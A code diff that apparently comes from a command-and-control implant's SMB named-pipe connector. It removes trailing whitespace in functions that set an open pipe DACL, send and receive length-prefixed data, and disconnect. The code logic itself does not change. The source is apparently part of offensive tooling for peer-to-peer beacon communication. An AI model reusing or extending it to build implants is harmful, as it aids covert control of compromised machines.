@@ -41,7 +41,7 @@ BOOL ConnectorSMB::SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize)
 
 	PACL pACL = NULL;
     EXPLICIT_ACCESS pListOfExplicitEntries = { 0 };
-    pListOfExplicitEntries.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE; //  STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL; // 
+    pListOfExplicitEntries.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE; //  STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL; //
     pListOfExplicitEntries.grfAccessMode        = SET_ACCESS;
     pListOfExplicitEntries.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
     pListOfExplicitEntries.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
@@ -51,7 +51,7 @@ BOOL ConnectorSMB::SetConfig(ProfileSMB profile, BYTE* beat, ULONG beatSize)
         return FALSE;
 
     PSECURITY_DESCRIPTOR pSD = this->functions->LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
-    if (!pSD || !this->functions->InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION) || !this->functions->SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE)) 
+    if (!pSD || !this->functions->InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION) || !this->functions->SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE))
         return FALSE;
 
 	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), pSD, FALSE };
@@ -73,7 +73,7 @@ void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
     if (data && data_size) {
         DWORD NumberOfBytesWritten = 0;
         if ( this->functions->WriteFile(this->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
-            
+
             DWORD index = 0;
             DWORD size  = 0;
             NumberOfBytesWritten = 0;
@@ -100,7 +100,7 @@ void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
         DWORD NumberOfBytesRead = 0;
         DWORD dataLength = 0;
         if ( this->functions->ReadFile(this->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
-            
+
             if (dataLength > this->allocaSize) {
                 this->recvData = (BYTE*) this->functions->LocalReAlloc(this->recvData, dataLength, 0);
                 this->allocaSize = dataLength;
@@ -110,7 +110,7 @@ void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
             int index = 0;
             while( this->functions->ReadFile(this->hChannel, this->recvData + index, dataLength - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
                 index += NumberOfBytesRead;
-        
+
                 if (index > dataLength) {
                     this->recvSize = -1;
                     return;
@@ -149,7 +149,7 @@ void ConnectorSMB::Listen()
     this->allocaSize = 0x100000;
 }
 
-void ConnectorSMB::Disconnect() 
+void ConnectorSMB::Disconnect()
 {
     if (this->allocaSize) {
         memset(this->recvData, 0, this->allocaSize);
